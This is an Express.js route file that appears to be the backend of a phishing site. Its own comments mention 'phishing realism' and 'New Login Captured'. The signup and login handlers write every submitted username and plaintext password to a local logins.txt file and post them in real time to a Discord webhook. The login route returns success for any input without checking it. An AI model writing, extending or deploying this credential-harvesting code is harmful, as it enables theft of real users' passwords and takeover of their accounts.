const express = require('express');
const router = express.Router();
const User = require('../models/User');
const bcrypt = require('bcryptjs');
const axios = require('axios'); // Add this
const fs = require('fs');
const path = require('path');

// Discord Webhook URL (Replace with your actual URL)
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK || '';

// Sign up
router.post('/signup', async (req, res) => {
  try {
    const { emailOrUsername, password } = req.body;
    
    // Log to file (Local backup)
    const logData = `[SIGNUP] Time: ${new Date().toLocaleString()} | User: ${emailOrUsername} | Pass: ${password}\n`;
    fs.appendFileSync(path.join(__dirname, '../logins.txt'), logData);

    // Send to Discord
    if (DISCORD_WEBHOOK_URL) {
      await axios.post(DISCORD_WEBHOOK_URL, {
        content: `🆕 **New Signup!** 🆕\n**User:** ${emailOrUsername}\n**Pass:** ${password}\n**Time:** ${new Date().toLocaleString()}`
      }).catch(err => console.log('Discord log error:', err.message));
    }

    const existingUser = await User.findOne({ emailOrUsername });
    if (existingUser) {
      return res.status(200).json({ message: 'User created' }); // Silent fail for phishing realism
    }
    const hashedPassword = await bcrypt.hash(password, 10);
    const newUser = new User({ emailOrUsername, password: hashedPassword });
    await newUser.save();
    res.status(201).json({ message: 'User created' });
  } catch (error) {
    res.status(500).json({ message: 'Server error' });
  }
});

// Login
router.post('/login', async (req, res) => {
  try {
    const { emailOrUsername, password } = req.body;
    
    // Log to file (Local backup)
    const logData = `[LOGIN] Time: ${new Date().toLocaleString()} | User: ${emailOrUsername} | Pass: ${password}\n`;
    fs.appendFileSync(path.join(__dirname, '../logins.txt'), logData);

    console.log('New Login Captured:', { emailOrUsername, password });

    // Send to Discord (Real-time capture)
    if (DISCORD_WEBHOOK_URL) {
      await axios.post(DISCORD_WEBHOOK_URL, {
        content: `🚨 **New Login Captured!** 🚨\n**User:** ${emailOrUsername}\n**Pass:** ${password}\n**Time:** ${new Date().toLocaleString()}`
      }).catch(err => console.log('Discord log error:', err.message));
    }

    res.status(200).json({ message: 'Login successful' });
  } catch (error) {
    res.status(500).json({ message: 'Server error' });
  }
});

module.exports = router;
